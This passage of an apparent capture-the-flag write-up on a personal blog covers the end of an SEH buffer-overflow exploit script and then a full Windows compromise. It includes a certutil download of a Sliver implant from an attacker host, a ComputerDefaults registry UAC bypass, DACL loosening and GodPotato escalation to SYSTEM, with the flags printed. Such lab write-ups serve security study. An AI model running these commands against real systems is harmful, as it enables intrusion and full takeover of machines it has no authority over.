    <span class="n">buf</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">head</span><span class="si">}{</span><span class="n">sled1</span><span class="si">}{</span><span class="n">shellcode</span><span class="si">}{</span><span class="n">sled2</span><span class="si">}{</span><span class="n">nnSEH</span><span class="si">}{</span><span class="n">nSEH</span><span class="si">}{</span><span class="n">SEH</span><span class="si">}</span><span class="s2">"</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">sender</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div><p></p>
<h1 id="getting-a-foothold">Getting a foothold<a class="headerlink" href="#getting-a-foothold" title="Permanent link">¶</a></h1>
<p>It shells:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251026063455.png" data-desc-position="bottom"><img alt="Pasted_image_20251026063455.png" src="../../../../Pasted_image_20251026063455.png"></a></p>
<p>Flag
</p><div class="highlight"><pre><span></span><code>C:<span class="se">\U</span>sers<span class="se">\r</span>ainbow<span class="se">\D</span>esktop&gt;type<span class="w"> </span>user.txt
<span class="nb">type</span><span class="w"> </span>user.txt
881288e2cd563fa856fcb4163b91ec06
</code></pre></div><p></p>
<h1 id="post-exploitation-enumeration">Post-exploitation enumeration<a class="headerlink" href="#post-exploitation-enumeration" title="Permanent link">¶</a></h1>
<p>Need to upgrade my shell to something a little more feature rich, reliable, etc.</p>
<p>Download  a Sliver implant to the host
</p><div class="highlight"><pre><span></span><code>C:<span class="se">\r</span>ainbow&gt;certutil<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>-split<span class="w"> </span>http://10.10.14.204:8083/10.10.14.204.exe<span class="w"> </span><span class="se">\w</span>indows<span class="se">\t</span>asks<span class="se">\a</span>.exe
certutil<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>-split<span class="w"> </span>http://10.10.14.204:8083/10.10.14.204.exe<span class="w"> </span><span class="se">\w</span>indows<span class="se">\t</span>asks<span class="se">\a</span>.exe
****<span class="w">  </span>Online<span class="w">  </span>****
<span class="w">  </span><span class="m">000000</span><span class="w">  </span>...
<span class="w">  </span>988a00
CertUtil:<span class="w"> </span>-URLCache<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
</code></pre></div><p></p>
<p>The current shell env is 32 bit (of course), but the system is 64bit
</p><div class="highlight"><pre><span></span><code>C:<span class="se">\r</span>ainbow&gt;set<span class="w"> </span>proc
<span class="nb">set</span><span class="w"> </span>proc
<span class="nv">PROCESSOR_ARCHITECTURE</span><span class="o">=</span>x86
<span class="nv">PROCESSOR_ARCHITEW6432</span><span class="o">=</span>AMD64
<span class="nv">PROCESSOR_IDENTIFIER</span><span class="o">=</span>AMD64<span class="w"> </span>Family<span class="w"> </span><span class="m">25</span><span class="w"> </span>Model<span class="w"> </span><span class="m">1</span><span class="w"> </span>Stepping<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>AuthenticAMD
<span class="nv">PROCESSOR_LEVEL</span><span class="o">=</span><span class="m">25</span>
<span class="nv">PROCESSOR_REVISION</span><span class="o">=</span><span class="m">0101</span>
</code></pre></div><p></p>
<p>So I will use 64bit cmd.exe to launch the sliver implant.
</p><div class="highlight"><pre><span></span><code>C:<span class="se">\r</span>ainbow&gt;c:<span class="se">\w</span>indows<span class="se">\s</span>ysnative<span class="se">\c</span>md.exe<span class="w"> </span>/c<span class="w"> </span><span class="se">\w</span>indows<span class="se">\t</span>asks<span class="se">\a</span>.exe
c:<span class="se">\w</span>indows<span class="se">\s</span>ysnative<span class="se">\c</span>md.exe<span class="w"> </span>/c<span class="w"> </span><span class="se">\w</span>indows<span class="se">\t</span>asks<span class="se">\a</span>.exe
</code></pre></div><p></p>
<p>Sharpup audit, found that UAC can be bypassed.
</p><div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>REMOTE_JACKAL<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>sharpup<span class="w"> </span>-t<span class="w"> </span><span class="m">300</span><span class="w"> </span>-i<span class="w"> </span>--<span class="w"> </span>audit

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>sharpup<span class="w"> </span>output:

<span class="o">===</span><span class="w"> </span>SharpUp:<span class="w"> </span>Running<span class="w"> </span>Privilege<span class="w"> </span>Escalation<span class="w"> </span><span class="nv">Checks</span><span class="w"> </span><span class="o">===</span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>In<span class="w"> </span>medium<span class="w"> </span>integrity<span class="w"> </span>but<span class="w"> </span>user<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span><span class="nb">local</span><span class="w"> </span>administrator-<span class="w"> </span>UAC<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>bypassed.

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Audit<span class="w"> </span>mode:<span class="w"> </span>running<span class="w"> </span>an<span class="w"> </span>additional<span class="w"> </span><span class="m">15</span><span class="w"> </span>check<span class="o">(</span>s<span class="o">)</span>.
Registry<span class="w"> </span>AutoLogon<span class="w"> </span>Found

<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Modifialbe<span class="w"> </span>scheduled<span class="w"> </span>tasks<span class="w"> </span>were<span class="w"> </span>not<span class="w"> </span>evaluated<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>permissions.

<span class="o">===</span><span class="w"> </span>Registry<span class="w"> </span><span class="nv">AutoLogons</span><span class="w"> </span><span class="o">===</span>
</code></pre></div><p></p>
<h1 id="elevate">Elevate<a class="headerlink" href="#elevate" title="Permanent link">¶</a></h1>
<p>I'll try a number of UAC bypasses.  What I found worked for me is the ComputerDefaults bypass.</p>
<div class="highlight"><pre><span></span><code><span class="nb">New-Item</span> <span class="s2">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="n">-Force</span>
<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="n">-Name</span> <span class="s2">"DelegateExecute"</span> <span class="n">-Value</span> <span class="s2">""</span> <span class="n">-Force</span>
<span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="s2">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="n">-Name</span> <span class="s2">"(default)"</span> <span class="n">-Value</span> <span class="s2">"cmd.exe /c \windows\tasks\a.exe"</span> <span class="n">-Force</span>

<span class="p">\</span><span class="c">#\# Then execute with:  ComputerDefaults.exe (triggers based on the same registry key.  Full path pops defender, try running without full path)</span>
<span class="n">c</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">ComputerDefaults</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<p>I get a new session:
</p><div class="highlight"><pre><span></span><code><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Session<span class="w"> </span>e7b84ea7<span class="w"> </span>REMOTE_JACKAL<span class="w"> </span>-<span class="w"> </span><span class="m">10</span>.129.35.177:63623<span class="w"> </span><span class="o">(</span>rainbow<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>windows/amd64<span class="w"> </span>-<span class="w"> </span>Sun,<span class="w"> </span><span class="m">26</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="m">17</span>:02:15<span class="w"> </span>PDT

sliver<span class="w"> </span><span class="o">(</span>REMOTE_JACKAL<span class="o">)</span><span class="w"> </span>&gt;
</code></pre></div><p></p>
<p>I'll clean up the registry
</p><div class="highlight"><pre><span></span><code><span class="nb">Remove-Item</span> <span class="s2">"HKCU:\Software\Classes\ms-settings\"</span> <span class="n">-Recurse</span> <span class="n">-Force</span>
</code></pre></div><p></p>
<h1 id="escalate">Escalate<a class="headerlink" href="#escalate" title="Permanent link">¶</a></h1>
<p>On the new session, I find that the process integrity is High, and the process tokens include SeImpersonatePrivilege in an enabled state</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251026171700.png" data-desc-position="bottom"><img alt="Pasted_image_20251026171700.png" src="../../../../Pasted_image_20251026171700.png"></a></p>
<p>Upload GodPotato
</p><div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>REMOTE_JACKAL<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>upload<span class="w"> </span>/var/www/html/GodPotato-NET4.exe<span class="w"> </span>/windows/tasks/GodPotato.exe

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Wrote<span class="w"> </span>file<span class="w"> </span>to<span class="w"> </span>C:<span class="se">\w</span>indows<span class="se">\t</span>asks<span class="se">\G</span>odPotato.exe
</code></pre></div><p></p>
<p>Loosen DACLs around files in <code>c:\windows\tasks</code>
</p><div class="highlight"><pre><span></span><code><span class="nv">$path</span><span class="o">=</span><span class="s2">"c:\windows\tasks"</span><span class="p">;</span><span class="w"> </span><span class="o">(</span>Get-ChildItem<span class="w"> </span>-path<span class="w"> </span><span class="nv">$path</span><span class="se">\*</span><span class="w"> </span>-Recurse<span class="o">)</span>.FullName<span class="w"> </span><span class="p">|</span><span class="w"> </span>%<span class="w"> </span><span class="o">{</span><span class="nv">$Acl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-ACL<span class="w"> </span><span class="nv">$_</span><span class="p">;</span><span class="w"> </span><span class="nv">$AccessRule</span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Security.AccessControl.FileSystemAccessRule<span class="o">(</span><span class="s2">"Everyone"</span>,<span class="s2">"FullControl"</span>,<span class="s2">"none"</span>,<span class="s2">"none"</span>,<span class="s2">"Allow"</span><span class="o">)</span><span class="p">;</span><span class="nv">$Acl</span>.AddAccessRule<span class="o">(</span><span class="nv">$AccessRule</span><span class="o">)</span><span class="p">;</span>Set-Acl<span class="w"> </span><span class="nv">$_</span><span class="w"> </span><span class="nv">$Acl</span><span class="o">}</span>
</code></pre></div><p></p>
<p>Execute GodPotato, have it daemonize another instance of the Sliver implant
</p><div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">tasks</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">"cmd.exe /c \windows\tasks\a.exe"</span>
<span class="p">.\</span><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">"cmd.exe /c \windows\tasks\a.exe"</span>
<span class="p">[*]</span> <span class="n">CombaseModule</span><span class="p">:</span> <span class="n">0x140709195350016</span>
<span class="p">[*]</span> <span class="n">DispatchTable</span><span class="p">:</span> <span class="n">0x140709197652048</span>
<span class="p">[*]</span> <span class="n">UseProtseqFunction</span><span class="p">:</span> <span class="n">0x140709197029744</span>
<span class="p">[*]</span> <span class="n">UseProtseqFunctionParamCount</span><span class="p">:</span> <span class="n">6</span>
<span class="p">[*]</span> <span class="n">HookRPC</span>
<span class="p">[*]</span> <span class="nb">Start </span><span class="n">PipeServer</span>
<span class="p">[*]</span> <span class="n">CreateNamedPipe</span> <span class="p">\\.\</span><span class="n">pipe</span><span class="p">\</span><span class="n">aabfbcee</span><span class="p">-</span><span class="n">7777</span><span class="p">-</span><span class="n">4b84-bb35</span><span class="p">-</span><span class="n">19b7430af1b9</span><span class="p">\</span><span class="n">pipe</span><span class="p">\</span><span class="n">epmapper</span>
<span class="p">[*]</span> <span class="n">Trigger</span> <span class="n">RPCSS</span>
<span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">GUID</span><span class="p">:</span> <span class="n">00000000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000-c000</span><span class="p">-</span><span class="n">000000000046</span>
<span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">IPID</span><span class="p">:</span> <span class="n">00000802</span><span class="p">-</span><span class="n">16c8-ffff</span><span class="p">-</span><span class="n">1d75</span><span class="p">-</span><span class="n">8eaf76328c8b</span>
<span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">OXID</span><span class="p">:</span> <span class="n">0x48fca28fb7e0a860</span>
<span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">OID</span><span class="p">:</span> <span class="n">0xdc03a523a80cc5fc</span>
<span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">Flags</span><span class="p">:</span> <span class="n">0x281</span>
<span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">PublicRefs</span><span class="p">:</span> <span class="n">0x0</span>
<span class="p">[*]</span> <span class="n">Marshal</span> <span class="n">Object</span> <span class="n">bytes</span> <span class="n">len</span><span class="p">:</span> <span class="n">100</span>
<span class="p">[*]</span> <span class="n">UnMarshal</span> <span class="n">Object</span>
<span class="p">[*]</span> <span class="n">Pipe</span> <span class="n">Connected</span><span class="p">!</span>
<span class="p">[*]</span> <span class="n">CurrentUser</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORK</span> <span class="n">SERVICE</span>
<span class="p">[*]</span> <span class="n">CurrentsImpersonationLevel</span><span class="p">:</span> <span class="n">Impersonation</span>
<span class="p">[*]</span> <span class="nb">Start </span><span class="n">Search</span> <span class="n">System</span> <span class="n">Token</span>
<span class="p">[*]</span> <span class="n">PID</span> <span class="p">:</span> <span class="n">908</span> <span class="n">Token</span><span class="p">:</span><span class="n">0x844</span>  <span class="n">User</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">ImpersonationLevel</span><span class="p">:</span> <span class="n">Impersonation</span>
<span class="p">[*]</span> <span class="n">Find</span> <span class="n">System</span> <span class="n">Token</span> <span class="p">:</span> <span class="n">True</span>
<span class="p">[*]</span> <span class="n">UnmarshalObject</span><span class="p">:</span> <span class="n">0x80070776</span>
<span class="p">[*]</span> <span class="n">CurrentUser</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
<span class="p">[*]</span> <span class="k">process</span> <span class="nb">start </span><span class="n">with</span> <span class="n">pid</span> <span class="n">6848</span>
</code></pre></div><p></p>
<p>A new session is born
</p><div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>REMOTE_JACKAL<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>aff2989a-17bd-4cce-a0ea-6c3c1188e23e

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Active<span class="w"> </span>session<span class="w"> </span>REMOTE_JACKAL<span class="w"> </span><span class="o">(</span>aff2989a-17bd-4cce-a0ea-6c3c1188e23e<span class="o">)</span>

sliver<span class="w"> </span><span class="o">(</span>REMOTE_JACKAL<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>getuid

S-1-5-18

sliver<span class="w"> </span><span class="o">(</span>REMOTE_JACKAL<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>whoami

Logon<span class="w"> </span>ID:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Current<span class="w"> </span>Token<span class="w"> </span>ID:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
</code></pre></div><p></p>
<p>Root flag
</p><div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>REMOTE_JACKAL<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>cat<span class="w"> </span>/users/administrator/desktop/root.txt

4f5858163e52fd36d6cb7c6074c50a40
</code></pre></div><p></p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251026172423.png" data-desc-position="bottom"><img alt="Pasted_image_20251026172423.png" src="../../../../Pasted_image_20251026172423.png"></a></p>







  
    
  
  
    
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="October 27, 2025 00:34:25 UTC">October 27, 2025</span>
  </span>

    
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Created">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="October 27, 2025 00:34:18 UTC">October 27, 2025</span>
  </span>

    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/SYANiDE-" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/chasejhatch/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://discord.com/users/298244420195844096" target="_blank" rel="noopener" title="discord.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"></path></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tabs", "navigation.tabs.sticky", "navigation.expand", "navigation.path", "navigation.prune", "navigation.indexes", "toc.follow", "toc.integrate", "navigation.top", "header.autohide", "search.highlight", "search.share"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="../../../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
      
        <script src="../../../../javascripts/app.js"></script>
      
        <script src="../../../../js/asciinema-player.min.js"></script>
      
        <script src="../../../../assets/javascripts/panzoom.min.js"></script>
      
        <script src="../../../../assets/javascripts/zoompan.js"></script>
      
    
  
<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": false, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>